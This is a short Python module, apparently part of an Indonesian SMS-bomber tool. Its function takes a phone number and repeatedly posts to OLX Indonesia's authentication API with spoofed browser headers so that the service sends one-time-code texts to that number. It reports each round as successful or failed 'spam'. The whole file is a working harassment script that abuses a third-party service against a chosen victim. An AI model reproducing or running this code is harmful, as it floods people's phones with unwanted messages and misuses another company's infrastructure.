import requests,os,sys,json
from time import sleep
from war.war import *

def olx(self, nom):
	sleep(1)
	print("")
	r = requests.Session()
	head = {
	"accept": "*/*",
	"x-newrelic-id": "VQMGU1ZVDxABU1lbBgMDUlI=",
	"x-panamera-fingerprint": "83b09e49653c37fb4dc38423d82d74d7#1597271158063",
	"user-agent": "Mozilla/5.0 (Linux; Android 6.0; A1601) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
	"content-type": "application/json",
	}

	dat = json.dumps({
	  "grantType": "retry",
	  "method": "sms",
	  "phone": "+62"+nom,
	  "language": "id"
	})

	for x in range(5):
		cal = r.post("https://www.olx.co.id/api/auth/authenticate",data=dat,headers=head).text
		if 'status' in cal:
			print(f"{k}[+] {c}Spam ke {k}{nom} {c}Berhasil ")
			sleep(2)
		else:
			print(f"{r}[+] {c}Spam ke {k}{nom} {c}Gagal Coba lagi dalam 10 menit!! ")
			sleep(2)
			exit("")
